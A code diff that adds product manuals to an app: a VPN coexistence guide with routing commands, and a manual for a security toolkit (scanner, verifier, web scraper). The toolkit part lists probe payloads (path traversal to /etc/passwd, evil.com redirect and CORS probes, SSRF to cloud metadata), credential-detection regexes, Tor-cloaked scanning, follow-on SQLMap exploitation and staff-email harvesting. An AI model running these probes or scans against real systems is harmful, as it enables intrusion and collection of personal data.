+8. MTU Optimizer
+9. Script Generator
+10. Per-VPN Configuration Notes
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW & USE CASES
+
+  VPN Coexistence (/vpn-coexist) solves one of the most common
+  enterprise and power-user problems: running ProxhqVPN alongside
+  another VPN simultaneously without routing conflicts.
+
+  Common coexistence scenarios:
+
+  Corporate VPN + ProxhqVPN:
+  You must connect to a corporate WireGuard or OpenVPN VPN for
+  work, while also keeping ProxhqVPN active for privacy.
+  → Use fwmark mode: separate fwmarks route corporate subnets to
+    corporate VPN and all other traffic to ProxhqVPN.
+
+  Tailscale + ProxhqVPN:
+  Both use WireGuard kernel module. Without coordination, they
+  compete for the same routing table entries.
+  → ProxhqVPN auto-detects Tailscale, assigns non-conflicting
+    fwmark values, and adjusts routing tables.
+
+  NordVPN / ExpressVPN + ProxhqVPN (double-hop):
+  Route ProxhqVPN traffic through a commercial VPN for an extra
+  hop. Your traffic: Device → Commercial VPN → ProxhqVPN exit.
+  From the perspective of any observer, your traffic comes from
+  the ProxhqVPN node IP (not your real IP, not the commercial VPN IP).
+
+  ZeroTier + ProxhqVPN:
+  ZeroTier creates L2 overlay networks. ProxhqVPN routes internet
+  traffic. Both can coexist using routing table mode.
+
+2. AUTO-DETECTION OF RUNNING VPNS
+
+  VPN Coexistence → Auto-Detect tab → "Scan for Running VPNs"
+
+  Detected VPN clients:
+  • NordVPN     (nordvpn process, nordlynx interface)
+  • ExpressVPN  (expressvpnd process, tun0 interface)
+  • ProtonVPN   (protonvpn-cli process)
+  • Mullvad     (mullvad CLI, wg-mullvad interface)
+  • Surfshark   (surfshark process, tun interface)
+  • Tailscale   (tailscaled, tailscale0 interface)
+  • ZeroTier    (zerotier-one, ztXXXXXX interface)
+  • Custom WG   (any wgX interface not belonging to ProxhqVPN)
+
+  For each detected VPN, the tool shows:
+  • Process name and PID
+  • WireGuard interface name
+  • Current fwmark value in use
+  • Routing table used
+  • Subnet routes claimed
+
+  ProxhqVPN then suggests non-conflicting configuration:
+  "Detected Tailscale using fwmark 51820, table 52. ProxhqVPN
+   will use fwmark 51821 and table 200."
+
+3. MODE 1 — FWMARK (RECOMMENDED)
+
+  fwmark (firewall mark) is a Linux mechanism that attaches a
+  numeric mark to packets. Different routing tables apply based
+  on the mark. This keeps VPN traffic completely isolated without
+  any packet leakage between tunnels.
+
+  How it works:
+  1. ProxhqVPN adds a WireGuard fwmark to all tunnel packets.
+  2. An ip rule routes marked packets to ProxhqVPN's routing table.
+  3. Unmarked packets (corporate VPN, LAN, etc.) use their own tables.
+  4. No packet can accidentally route through the wrong tunnel.
+
+  Default assignment:
+    ProxhqVPN: fwmark 51820 → routing table 200
+    (if conflict detected, reassigned to fwmark 51821 → table 201, etc.)
+
+  Generated configuration:
+    # Set ProxhqVPN fwmark
+    wg set wg0 fwmark 51820
+
+    # Create routing table for ProxhqVPN
+    ip route add default dev wg0 table 200
+    ip rule add fwmark 51820 lookup 200
+
+    # Verify
+    ip rule show
+    ip route show table 200
+
+  Compatibility: Linux only (fwmark is a Linux kernel feature).
+  macOS/Windows: use Routing Table mode instead.
+
+4. MODE 2 — DOUBLE-HOP
+
+  Double-Hop routes your traffic through a commercial VPN FIRST,
+  then through ProxhqVPN as the final exit. This creates a 2-hop
+  anonymization chain.
+
+  Traffic flow:
+  Your device → Commercial VPN server → ProxhqVPN node → Internet
+
+  Your visible IP at destination = ProxhqVPN node IP
+  Commercial VPN server sees: your real IP → ProxhqVPN traffic
+  ProxhqVPN server sees: commercial VPN IP → your traffic
+  Neither knows the full picture.
+
+  Setup:
+  1. Connect to the commercial VPN first (NordVPN, ExpressVPN, etc.)
+  2. Open VPN Coexistence → Double-Hop tab.
+  3. ProxhqVPN auto-detects the commercial VPN's DNS and gateway.
+  4. Add ProxhqVPN's server IP to the commercial VPN's split tunnel
+     exceptions (so the WireGuard handshake packet goes directly).
+  5. Click "Apply Double-Hop Configuration".
+  6. Your ProxhqVPN traffic now routes through the commercial VPN.
+
+  Commercial VPN exception (critical):
+  The ProxhqVPN server IP MUST be excluded from the commercial
+  VPN's tunnel. Otherwise: traffic goes VPN→ProxhqVPN, but the
+  WireGuard handshake to ProxhqVPN never completes (loop).
+
+  Auto-exception:
+  VPN Coexistence → Double-Hop → "Auto-Configure Exception"
+  → Automatically adds ProxhqVPN server IPs to the commercial
+    VPN client's split tunnel exclude list.
+
+5. MODE 3 — NETWORK NAMESPACE
+
+  Linux network namespaces provide complete kernel-level isolation.
+  ProxhqVPN runs in its own network namespace — it has its own
+  interfaces, routing tables, and firewall rules. Other VPNs in
+  the default namespace cannot see or interfere with it.
+
+  Isolation level: COMPLETE. No possibility of cross-tunnel routing.
+
+  Setup (requires root):
+  VPN Coexistence → Namespace Mode → "Create Namespace"
+  → Creates a network namespace named "proxhq"
+  → Moves ProxhqVPN WireGuard interface into the namespace
+  → Configured applications route through the namespace
+
+  Run applications in the ProxhqVPN namespace:
+    # Run Firefox through ProxhqVPN namespace only
+    sudo ip netns exec proxhq firefox
+
+    # Run terminal through ProxhqVPN namespace
+    sudo ip netns exec proxhq bash
+
+  Use case: isolate specific applications (browser, torrent client)
+  to always use ProxhqVPN, while other apps use the corporate VPN.
+
+  Limitation: requires root access on Linux. Not available on macOS
+  or Windows.
+
+6. MODE 4 — ROUTING TABLE
+
+  Separate routing tables are created for ProxhqVPN and other VPNs.
+  Traffic is directed to the correct table based on destination
+  subnet, not fwmark.
+
+  This is the most cross-platform compatible mode:
+  Works on: Linux, macOS (route add), Windows (route add)
+
+  Linux setup (auto-generated):
+    # ProxhqVPN routing table (table 200)
+    ip route add 0.0.0.0/0 dev wg0 table 200
+
+    # Route specific destination through ProxhqVPN
+    ip rule add to 192.168.100.0/24 lookup main   # Corporate subnet via corporate VPN
+    ip rule add to 0.0.0.0/0 lookup 200            # All else via ProxhqVPN
+
+  macOS setup (auto-generated):
+    route add -net 10.0.0.0/8 -interface utun0     # Corporate subnets via corp VPN
+    route add -net 0.0.0.0/1 -interface utun1      # Internet via ProxhqVPN
+    route add -net 128.0.0.0/1 -interface utun1
+
+  Windows setup (auto-generated via netsh):
+    route add 10.0.0.0 mask 255.0.0.0 [corp-gateway] metric 1
+    route add 0.0.0.0 mask 0.0.0.0 [proxhq-gateway] metric 2
+
+7. EXCEPTION RULES
+
+  Exception rules give per-destination routing control:
+
+  bypass-proxhq:
+    Specific destinations bypass ProxhqVPN and use default routing.
+    Use for: corporate subnets, LAN devices, local services.
+    Example: bypass-proxhq 10.0.0.0/8 (corporate intranet)
+
+  force-proxhq:
+    Specific destinations ALWAYS use ProxhqVPN even if another
+    VPN has claimed that subnet.
+    Use for: privacy-critical destinations you always want private.
+    Example: force-proxhq 0.0.0.0/0 (force all through ProxhqVPN)
+
+  block:
+    Specific destinations are blocked entirely — neither VPN routes
+    them. Traffic is dropped.
+    Use for: blocking ad/tracker IPs at the routing level.
+    Example: block 192.168.1.200/32 (block a specific LAN device)
+
+  Exception rules UI:
+  VPN Coexistence → Exception Rules → + Add Rule
+  Select type → enter IP/CIDR → Save → Apply.
+
+8. MTU OPTIMIZER
+
+  Running two VPN tunnels simultaneously adds overhead. Each
+  WireGuard tunnel subtracts ~60 bytes from the MTU:
+  • Physical MTU: typically 1500 bytes (Ethernet)
+  • WireGuard overhead: 60 bytes
+  • Single VPN MTU: 1440 bytes
+  • Double-Hop MTU: 1380 bytes (two WireGuard headers)
+
+  If MTU is not correctly configured:
+  • Large packets are fragmented (performance drop)
+  • Some connections stall or fail (especially HTTPS with TLS records)
+
+  MTU Optimizer:
+  VPN Coexistence → MTU Optimizer → "Run MTU Test"
+  Tests the optimal MTU value by sending probe packets of varying sizes.
+  Automatically sets the correct MTU on all VPN interfaces.
+
+  Manual MTU setting:
+    ip link set mtu 1380 dev wg0
+    wg set wg0 mtu 1380
+
+9. SCRIPT GENERATOR
+
+  VPN Coexistence → Script Generator
+
+  Select your mode, detected VPN, and exception rules.
+  Click "Generate Script" → downloads a .sh (Linux/macOS) or .bat (Windows) file.
+
+  The generated script:
+  • Sets correct fwmark values
+  • Creates routing tables
+  • Adds ip rule entries
+  • Configures exception routes
+  • Sets correct MTU on all interfaces
+  • Includes undo instructions (reset script)
+
+  Always review the generated script before running it.
+  Test in a non-production environment first.
+
+10. PER-VPN CONFIGURATION NOTES
+
+  NordVPN:
+    NordLynx uses WireGuard with fwmark 51820. ProxhqVPN will
+    auto-detect and switch to fwmark 51821.
+    Recommended mode: fwmark (Linux) or Double-Hop
+
+  ExpressVPN:
+    Uses OpenVPN or Lightway (UDP). Creates tun0 interface.
+    No WireGuard conflict. Use routing-table mode.
+    For Double-Hop: exclude ProxhqVPN server IPs from ExpressVPN tunnel.
+
+  ProtonVPN:
+    WireGuard with custom fwmark. Auto-detected.
+    Recommended mode: fwmark with auto-detection.
+
+  Mullvad:
+    WireGuard with interface name wg-mullvad-XXXX.
+    Auto-detected. Recommended mode: fwmark.
+
+  Tailscale:
+    Uses WireGuard, fwmark 51820, table 52 (default).
+    ProxhqVPN auto-adjusts to table 200, fwmark 51821.
+    Recommended mode: fwmark (auto-configured by detection).
+
+  ZeroTier:
+    Creates ztXXXX interfaces. Routes L2 overlay traffic.
+    No WireGuard conflict. Use routing-table mode.
+    Add ZeroTier subnets as bypass-proxhq exception rules.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "alpha-toolkit-manual",
+    title: "Alpha Toolkit — Universal Scanner, Verifier & Web Scraper",
+    subtitle: "Complete reference for the 3-tool suite with Tor Cloak and Scanner→Verifier pipeline",
+    version: "2.0",
+    pages: 18,
+    icon: Zap,
+    iconColor: "text-emerald-400",
+    tier: "pro",
+    content: `Alpha Toolkit — User Manual
+Version 2.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+Command Center Pro Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+LEGAL NOTICE: Only scan targets you own or have written
+permission to test. Unauthorized scanning is illegal.
+ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability for misuse.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview — 3-Tool Suite
+2. Tor Cloak (Global)
+3. Tool 1 — Universal Scanner (v4.0)
+4. Scanner Modes (Network / Security / Exploit / Full)
+5. Scanner Command Flags Reference
+6. Tool 2 — Vulnerability Verifier
+7. Scanner → Verifier Pipeline
+8. Verifier Output: Confirmed vs. False Positive
+9. Tool 3 — Web Scraper
+10. Web Scraper Database Schema (14 tables)
+11. Exporting Scraped Data
+12. Common Workflows
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW — 3-TOOL SUITE
+
+  Alpha Toolkit (/alpha-tools) is an integrated 3-tool security
+  research suite:
+
+  Tool 1 — Universal Scanner v4.0:
+    Scans targets for security vulnerabilities, misconfigurations,
+    exposed credentials, and network services. Supports 35+
+    programming languages, 200+ vulnerability patterns, multi-step
+    exploit chain detection, port scanning, and service fingerprinting.
+
+  Tool 2 — Vulnerability Verifier:
+    Takes the Scanner's HTML report and ACTIVELY PROBES each finding
+    against the live target to confirm real exposure vs. false positive.
+    TLS handshakes, TCP banner grabs, SQL probes, SSRF checks.
+
+  Tool 3 — Web Scraper:
+    Browser-based recursive web scraper. Captures 14 data types
+    (pages, links, emails, forms, scripts, cookies, etc.) into a
+    local SQLite database. Exportable as .sqlite, CSV, or JSON.
+
+  All three tools support Tor Cloak (Section 2).
+  Tools are designed to work as a pipeline (Section 7).
+
+2. TOR CLOAK (GLOBAL)
+
+  The Tor Cloak toggle at the top of the Alpha Toolkit page routes
+  ALL tool traffic through the Tor SOCKS5 proxy at 127.0.0.1:9050.
+
+  When Tor Cloak is ON:
+  • The Tor badge shows your current Tor exit node IP address.
+  • ALWAYS verify the badge shows a Tor exit IP (not your real IP)
+    before starting any scan.
+  • All scanner requests, verifier probes, and scraper fetches
+    route through Tor circuits.
+  • Tor circuit rotation: circuits are rotated every 10 minutes
+    automatically. Click "New Circuit" to rotate immediately.
+
+  When Tor Cloak is OFF:
+  • Scanner/Verifier/Scraper use the ProxhqVPN server's IP.
+  • Still anonymous (ProxhqVPN server IP, not your real IP).
+  • Faster than Tor.
+
+  IMPORTANT: Tor Cloak routes traffic through Tor's EXISTING
+  circuits. It does not guarantee a specific exit country.
+  For country-specific exit: use the OnionBrowser (/onion-browser)
+  with a custom exit node instead.
+
+3. TOOL 1 — UNIVERSAL SCANNER V4.0
+
+  Alpha Toolkit → Scanner tab
+
+  Target input:
+  Network/All mode:   IP address or hostname (e.g. 192.168.1.1 or target.com)
+  Security mode:      File path or URL to source code repository
+  Exploit mode:       URL to the web application endpoint
+
+  Options:
+  Port Range:         e.g. 1-10000 (network scan only)
+  Threads:            1–50 (parallel scan threads)
+  Language override:  --lang php  (force detection, e.g. for mixed repos)
+  Extra flags:        any additional scanner flags (see Section 5)
+  Tor Cloak:          route through Tor (top-right toggle)
+
+  Supported languages (35+):
+  Python, JavaScript, TypeScript, PHP, Ruby, Java, C, C++, C#,
+  Go, Rust, Swift, Kotlin, Scala, Perl, Bash, PowerShell,
+  Lua, R, MATLAB, Groovy, Clojure, Elixir, F#, OCaml,
+  Terraform, CloudFormation, Kubernetes YAML, Dockerfile,
+  Ansible, Nginx/Apache config, SQL files, .env files,
+  HTML, CSS, XML, JSON
+
+4. SCANNER MODES
+
+  NETWORK SCAN:
+    What it does: TCP port scanning + service fingerprinting +
+                  banner grabbing via nmap integration.
+    Target: IP address or hostname.
+    Output:
+    • Open ports list with service name + version banner
+    • OS fingerprint (if detectable)
+    • SSL/TLS cert info for any HTTPS ports
+    • Common default credentials check for detected services
+    • Script scan results (nmap -sC equivalent)
+
+    Example: scan a server for all common services:
+    Target: 192.168.1.100  Ports: 1-10000  Threads: 50
+    → Finds: 22/SSH, 80/HTTP, 443/HTTPS, 3306/MySQL, 5432/PgSQL
+
+  SECURITY AUDIT:
+    What it does: Scans source code or config files for:
+    • Hardcoded secrets: API keys, passwords, tokens in code
+    • Weak cryptography: MD5 hashes, DES, 512-bit RSA
+    • Dangerous functions: eval(), exec(), system(), os.popen()
+    • SQL query construction: string concatenation = SQLi risk
+    • Deserialization: unserialize(), pickle.loads() without validation
+    • Path construction: user input in file paths
+    • Insecure temp files, world-readable files
+    Target: GitHub URL, local file upload, or pasted code.
+
+    Secret detection patterns:
+    • AWS keys: AKIA[0-9A-Z]{16}
+    • GCP keys: AIza[0-9A-Za-z-_]{35}
+    • GitHub tokens: ghp_[a-zA-Z0-9]{36}
+    • Private keys: -----BEGIN RSA PRIVATE KEY-----
+    • Passwords: password=, passwd=, pwd= followed by a value
+    • Connection strings: postgresql://, mongodb://, redis://
+
+  EXPLOIT SCAN:
+    What it does: Tests 200+ vulnerability patterns against a live URL.
+    Target: URL of the web application.
+    Tests include:
+    • XSS reflection: injects probe in every URL parameter
+    • SQL injection: error-based probe on all parameters
+    • Path traversal: ../../../../etc/passwd in file parameters
+    • Open redirect: ?next=https://evil.com probe
+    • CORS: Origin: https://evil.com → check Access-Control-Allow-Origin
+    • SSRF: ?url=http://169.254.169.254/ probe
+    • Default admin panels: /admin, /wp-admin, /phpmyadmin, /manager
+    • Exposed files: /.git/, /.env, /config.php, /backup.sql
+    • HTTP methods: OPTIONS, TRACE, PUT probe
+
+  FULL SCAN:
+    Runs all three modes sequentially on the same target.
+    Generates a comprehensive HTML report consolidating all findings.
+    Longest runtime: 5–30 minutes depending on target size.
+
+5. SCANNER COMMAND FLAGS REFERENCE
+
+  --lang [language]
+    Force scanner to treat all files as specified language.
+    Example: --lang python (useful for .py files with unusual extensions)
+
+  --deep
+    Enable deep scan mode: recursively follow all links and scan
+    discovered pages/endpoints. May significantly increase scan time.
+
+  --config-audit
+    Enable configuration file auditing: scans .env, .yaml, .json,
+    nginx.conf, apache.conf, etc. for security misconfigurations.
+
+  --no-banner
+    Skip banner grabbing on network scan (faster, less detectable).
+
+  --rate [N]
+    Limit scan rate to N requests per second (default: 20/s).
+    Use for sensitive targets: --rate 2
+
+  --timeout [ms]
+    Per-request timeout in milliseconds (default: 3000ms).
+
+  --report-path [path]
+    Save report to specified path on the server (admin only).
+
+  --exclude [pattern]
+    Exclude URLs matching pattern from exploit scan.
+    Example: --exclude "logout|delete" (avoid destructive endpoints)
+
+  --output json
+    Return results as JSON instead of HTML report (for API use).
+
+6. TOOL 2 — VULNERABILITY VERIFIER
+
+  Alpha Toolkit → Verifier tab
+
+  The Verifier takes an Alpha Scanner HTML report and ACTIVELY PROBES
+  each finding against the live target to determine:
+  • CONFIRMED: finding is real, actively exploitable
+  • FALSE POSITIVE: finding appears in report but not actually vulnerable
+  • UNKNOWN: could not determine (timeout, CAPTCHA, WAF)
+
+  How probing works:
+  • SQL error findings: sends the same payload again, looks for DB error
+  • Path traversal: tries to actually read /etc/passwd via the path
+  • XSS reflection: checks if probe string appears unescaped in response
+  • SSRF: checks if the server makes an outbound request to a canary URL
+  • Exposed file (.env, .git): checks if file is downloadable
+  • Open port: makes TCP connection to confirm port is open
+  • TLS findings: performs new TLS handshake, records cipher/protocol
+  • CDN detection: if target is behind Cloudflare/Akamai, flags findings
+    as "CDN — may not affect origin directly"
+
+7. SCANNER → VERIFIER PIPELINE
+
+  The Alpha Toolkit is designed as a sequential pipeline:
+  Scanner detects → Verifier confirms → Confirmed findings actioned.
+
+  Step 1: Run Universal Scanner (any mode).
+  Step 2: Wait for scan to complete. Status shows 100%.
+  Step 3: Click "Send to Verifier" (green button, top of results panel).
+           → App automatically switches to Verifier tab.
+           → HTML report is pre-loaded (~N KB shown in report info).
+  Step 4: (Optional) Set a Target URL Override.
+           If the scanner detected a base domain but the finding
+           is on a specific path, set the override to the path.
+  Step 5: (Optional) Toggle Tor Cloak if not already on.
+  Step 6: Click "Verify Findings".
+  Step 7: Verifier probes each finding. Progress bar shows status.
+  Step 8: Results appear with confirmation status per finding.
+
+  Confirmed findings (red):
+  Actively exploitable. Requires immediate remediation.
+
+  False positives (grey):
+  Scanner detected a pattern but active probing found no vulnerability.
+  Common causes: WAF blocks, framework protection, test environment data.
+
+  CDN warning (yellow):
+  The target is behind a CDN (Cloudflare, Fastly, Akamai).
+  Findings may not apply to the origin server behind the CDN.
+
+8. VERIFIER OUTPUT: CONFIRMED VS. FALSE POSITIVE
+
+  Final Exposure Report includes:
+  • Total findings from Scanner
+  • Confirmed exploitable: N
+  • False positives filtered: M
+  • CDN warnings: K
+  • Overall risk score (CRITICAL / HIGH / MEDIUM / LOW)
+  • Per-finding: technique, evidence, recommended fix
+
+  Download: "Download Exposure Report" → formatted .txt file
+  Color-coded: RED = confirmed, GREY = false positive
+
+9. TOOL 3 — WEB SCRAPER
+
+  Alpha Toolkit → Scraper tab
+
+  The Web Scraper runs in the browser and crawls any website,
+  storing all captured data in a local SQLite database.
+
+  Configuration:
+  Start URL:    https://target.com (starting point for crawl)
+  Depth:        1–10 (how many link-hops from start URL to follow)
+  Max pages:    1–10,000 (total pages to capture)
+  Same-domain:  YES/NO (follow only links on the same domain?)
+  Tor Mode:     route all fetch requests through Tor (top-right toggle)
+  Delay:        0–5000ms between requests (polite crawling)
+
+  Include/exclude patterns:
+  Include: only crawl URLs matching regex (e.g. /api/, /blog/)
+  Exclude: skip URLs matching regex (e.g. /logout, /delete, /admin)
+
+  Click "Start Scrape". Live progress bar shows:
+  Pages crawled, links found, emails discovered, forms captured.
+
+10. WEB SCRAPER DATABASE SCHEMA (14 TABLES)
+
+  Table: pages
+    url, title, meta_description, html_content (full page HTML),
+    http_status_code, content_type, crawled_at, depth_level
+
+  Table: links
+    source_url, target_url, anchor_text, is_internal, is_external,
+    is_broken (404/500), link_type (href/src/action)
+
+  Table: emails
+    email_address, found_on_url, context_snippet (surrounding text),
+    is_verified_format, first_seen
+
+  Table: phones
+    phone_number, found_on_url, raw_text (as it appeared on page),
+    country_code_detected
+
+  Table: images
+    image_url, alt_text, width, height, found_on_url
+
+  Table: forms
+    form_action, form_method, found_on_url, form_id, form_name,
+    has_csrf_token, input_fields (JSON array of {name, type, value})
+
+  Table: opengraph
+    url, og_title, og_description, og_image, og_type, og_site_name,
+    og_url, og_locale
+
+  Table: jsonld
+    url, json_ld_type, raw_json (full JSON-LD block), schema_type
+
+  Table: headers
+    url, header_name, header_value, captured_at
+    (All HTTP response headers per page)
+
+  Table: cookies
+    url, cookie_name, cookie_value, domain, path,
+    is_http_only, is_secure, same_site, expires_at
+
+  Table: scripts
+    script_url, is_inline, integrity_hash (SRI), crossorigin,
+    found_on_url, script_preview (first 200 chars if inline)
+
+  Table: stylesheets
+    stylesheet_url, media_type, is_inline, found_on_url
+
+  Table: assets
+    asset_url, asset_type (font/video/audio/pdf/other),
+    found_on_url, file_size_estimate
+
+  Table: metadata
+    crawl_id, start_url, start_time, end_time, total_pages,
+    total_links, max_depth, tor_mode_active, user_agent_used
+
+11. EXPORTING SCRAPED DATA
+
+  Three export formats:
+
+  SQLite (.sqlite):
+    Full database file — open in DB Browser for SQLite.
+    Query across all 14 tables with full SQL support.
+    Best for: deep analysis, correlation queries.
+
+  CSV (per table):
+    One .csv file per table.
+    Download as .zip (all tables) or individual table CSV.
+    Best for: spreadsheet analysis, Excel pivot tables.
+
+  JSON (full export):
+    All tables as a single nested JSON structure.
+    Best for: programmatic processing, API ingestion.
+
+  Export: Scraper tab → Results → "Export" → select format → Download.
+
+12. COMMON WORKFLOWS
+
+  WORKFLOW: Bug Bounty Recon on a Target Domain
+  1. Tor Cloak: ON.
+  2. Scanner → Exploit Scan → target.com.
+  3. Wait for scan. Note findings.
+  4. Send to Verifier → confirm critical/high findings.
+  5. Scraper → crawl target.com depth 3 → export emails + forms.
+  6. Send confirmed SQLi findings to SQLMap for full exploitation.
+  7. Compile Ghost Chain report with all confirmed findings.
+
+  WORKFLOW: Source Code Security Audit
+  1. Tor Cloak: OFF (local source code, no network needed).
+  2. Scanner → Security Audit → paste GitHub URL or upload zip.
+  3. Review hardcoded secrets and dangerous function calls.
+  4. Download HTML report.
+  5. Send to Verifier with Target URL = staging environment.
+  6. Verifier confirms which code vulnerabilities are actually reachable.
+
+  WORKFLOW: Competitive Intelligence / OSINT
+  1. Tor Cloak: ON.
+  2. Scraper → target domain depth 5, same-domain only.
+  3. Export emails table → list of all staff email addresses found.
+  4. Export forms table → all form endpoints (API recon).
+  5. Export scripts table → third-party tools/trackers used.
+  6. Cross-reference emails with Dark Web Monitor.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
 ];
 
 // ── Category grouping ─────────────────────────────────────────────────────────
 const CATEGORIES = [
   {
-    label: "VPN & Privacy",
+    label: "VPN & Privacy — Core",
     color: "text-green-400",
     border: "border-green-900",
     bg: "bg-green-950/20",
-    ids: ["vpn-getting-started", "wireguard-advanced", "privacy-suite-tools"],
+    ids: ["vpn-getting-started", "wireguard-advanced", "privacy-suite-tools", "network-monitor-manual", "dns-sinkhole-manual", "firewall-manual", "kill-switch-manual"],
+  },
+  {
+    label: "Advanced Privacy",
+    color: "text-violet-400",
+    border: "border-violet-900",
+    bg: "bg-violet-950/20",
+    ids: ["post-quantum-manual", "daita-manual", "vpn-coexist-manual"],
   },
   {
     label: "Command Center Pro — Security Tools",
     color: "text-red-400",
     border: "border-red-900",
     bg: "bg-red-950/20",
-    ids: ["omnistrike-manual", "waf-analyzer-manual", "social-breach-manual", "bug-bounty-hub-manual", "dev-security-tools-v2"],
+    ids: ["omnistrike-manual", "waf-analyzer-manual", "social-breach-manual", "bug-bounty-hub-manual", "dev-security-tools-v2", "ghost-chain-manual", "http-interceptor-manual", "jwt-analyzer-manual", "sqli-scanner-manual", "ssl-tls-manual", "iac-scanner-manual", "alpha-toolkit-manual"],
   },
   {
     label: "Blockchain Security",
@@ -2649,7 +7776,7 @@ const CATEGORIES = [
     color: "text-blue-400",
     border: "border-blue-900",
     bg: "bg-blue-950/20",
-    ids: ["osint-recon-manual", "canary-tokens-manual", "siem-manual"],
+    ids: ["osint-recon-manual", "canary-tokens-manual", "siem-manual", "ghost-trap-manual", "ghost-trace-manual", "dark-web-monitor-manual", "username-intel-manual"],
   },
   {
     label: "Platform Security",
@@ -2659,11 +7786,11 @@ const CATEGORIES = [
     ids: ["security-hardening-v21"],
   },
   {
-    label: "Employee & Administration",
+    label: "Admin Tools",
     color: "text-amber-400",
     border: "border-amber-900",
     bg: "bg-amber-950/20",
-    ids: ["employee-procedures"],
+    ids: ["employee-procedures", "terminal-manual", "sql-interface-manual"],
   },
 ];
 
